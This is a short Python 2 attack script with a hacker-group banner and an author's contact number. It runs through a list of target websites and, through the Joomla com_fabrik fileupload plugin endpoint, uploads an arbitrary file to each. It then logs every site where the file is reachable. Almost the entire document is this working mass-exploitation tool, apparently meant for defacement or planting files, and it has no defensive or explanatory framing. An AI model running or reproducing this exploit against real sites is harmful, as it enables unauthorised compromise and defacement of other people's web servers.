#!/usr/bin/env python

import requests
import httplib
import urllib
import sys
import os

W  = "\033[0m";
R  = "\033[31m";
Y  = "\033[93m";
G  = "\033[32m";
O  = "\033[33m";
B  = "\033[34m";

print(B+"""
:::::::::::::::::::::::::::::::::::::::::::
::                      .-.-..
                    /+/++//
                   /+/++//
            *   * /+/++//
             \ /  |/__//
           {X}v{X}-/|PRX|==========.
             [']  /'|'\           \
                              '
                 \_  \_ \_   \rk*\rDragonFly ZomBie
\r
author the dark night
contack: +6288214569363
indonesia security lite
jika ada yg tidak tahu kontak saya:) ###########################################################

::   ::::::           ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
""")

     
try:
    list = sys.argv[1]
    scrp = sys.argv[2]
except:
    print(Y+"[!] Usage: python2 "+sys.argv[0]+" web-vuln.txt index.html\n")
    exit(1)

out = open('output.txt', 'a')
print(B+"[+]"+W+" Exploiting Service Started !\n")
f = open(list, 'r')
while True:
 trgt = f.readline().replace('\n', '')
 if not trgt:
  break
 url = trgt+'index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
 fin = open(scrp, 'rb')
 files = {'file': fin}
 r = requests.post(url, files=files)
 cek = urllib.urlopen(trgt+scrp).getcode()
 if cek == 200:
  print(G+" [*] "+trgt+scrp+" -> SUKSES")
  out.write(trgt+scrp+'\n')
 else:
  print(R+" [*] "+trgt+scrp+" -> FAILED")
  pass
print(W+"\n[+] Service Exploiting Done !\n")